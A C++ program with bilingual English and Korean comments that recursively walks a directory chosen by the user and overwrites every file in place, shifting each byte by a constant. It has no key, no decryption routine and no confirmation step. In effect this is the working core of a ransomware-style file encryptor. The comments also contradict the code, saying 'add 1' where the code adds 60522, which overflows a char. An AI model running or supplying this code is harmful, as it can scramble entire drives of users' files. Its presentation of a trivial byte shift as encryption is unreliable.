#include <iostream>
#include <fstream>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>

// This function will encrypt a single file(이 함수는 단일 파일을 암호화 합니다)
void encryptFile(std::string filePath) {
    // File is the file will be encrypted(파일이 암호화됩니다)
    // tempFile is a temperary file which save encrypted data of file(tempFile은 파일의 암호화된 데이터를 저장하는 임시 파일입니다)
    std::fstream file, tempFile; // 문자열 입력 및 출력 파일 스트림에 대한 클래스 fstream
    std::string tempFilePath = "temp.txt"; // 임시 파일 경로

    // Open file streams(파일 스트림 열기)
    // Open file to read, temp file to write(읽을 파일 열기, 쓸 temp.txt(tempFilePath에 있는) 파일 열기)
    file.open(filePath, std::ios::in);
    tempFile.open(tempFilePath, std::ios::out);

    // Read byte by byte through file(파일을 바이트 단위로 읽기)
    char byte;

    while (file >> std::noskipws >> byte) {
        // Encrypt this byte by add 1 to it(해당 바이트에 60522를 더하여 암호화)
        byte += 60522;
        // Save this byte into temp file(temp 파일에 이 바이트를 저장)
        tempFile << byte;
    }

    // Close file streams(파일 스트림 닫기)
    file.close();
    tempFile.close();

    // Open file streams(파일 스트림 열기)
    // But this time we will open file to write and temp file to read(하지만 이번에는 쓸 파일을 열고 읽을 temp.txt 파일을 열겠습니다)
    file.open(filePath, std::ios::out);
    tempFile.open(tempFilePath, std::ios::in);

    // Read through temp.txt file byte by byte(temp.txt 파일을 바이트 단위로 읽습니다)
    while (tempFile >> std::noskipws >> byte) {
        // Save this byte into file(파일에 이 바이트를 저장합니다)
        file << byte;
    }

    // Close file streams(파일 스트림 닫기)
    file.close();
    tempFile.close();
}

// This function will read through all directories and file in a directory(이 함수는 디렉터리의 모든 디렉터리 및 파일을 읽습니다)
// If it find a file, it will encrypt that file(파일을 찾으면 해당 파일을 암호화합니다)
// If it find a directory, it will read through that directory(디렉토리를 찾으면 해당 디렉토리를 읽습니다)
void encryptDirectory(std::string directoryPath) {
    DIR* directory; // format: typedef struct __dirstream_t DIR;
    struct dirent* entry; 
    //  dirent format:
    //      struct dirent
    //      {
    //          long            d_ino;		/* Always zero. */
    //          unsigned short  d_reclen;		/* Always sizeof struct dirent. */
    //          unsigned short  d_namlen;		/* Length of name in d_name. */
    //          unsigned        d_type;		/* File attributes */
    //          char            d_name[FILENAME_MAX]; /* File name. */
    //      };
    struct stat status;
    std::string path;

    // Open the directory(디렉터리 열기)
    if ((directory = opendir(directoryPath.c_str())) != NULL) {
        // Open directory successfully
        // Read through directory
        while((entry = readdir(directory)) != NULL) {
            // Check if this entry (file or directory) is current directory (".") or parent directory ("..")
            // 이 항목(파일 또는 디렉터리)이 현재 디렉터리(".")인지 아니면 상위 디렉터리("..")인지 확인합니다.
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) { // 구조체 포인터를 사용하여 dirent 구조체에 d_name에 접근하여 값을 strcmp() 함수로 문자열 "."(자식) && ".."(부모)과 비교하여 0이 아닐 경우
                // Get entry full path(개체의 절대경로를 얻습니다)
                path = directoryPath + "\\" + entry->d_name;
                // Check if this entry is a directory or file
                stat(path.c_str(), &status);
                if (S_ISDIR(status.st_mode)) { // Directory인지 File인지 검사합니다
                    // This is a directory
                    // We will read through it
                    encryptDirectory(path); // 재귀를 이용해 Directory일 경우 encryptDirectory()를 호출하여 해당 디렉터리를 다시 검사합니다
                }else {
                    // This is a file
                    // We will encrypt it
                    encryptFile(path); // File일 경우 encryptFile()을 이용하여 파일을 암호화합니다.
                }
            }
        }
    }
}

int main() {
    std::string input; // 문자열을 받는 input
    std::cout << "Enter the full path for encryption: ";
    std::cin >> input; // Input
    // Encrypt directory
    encryptDirectory(input); // Call Function

    return 0;
}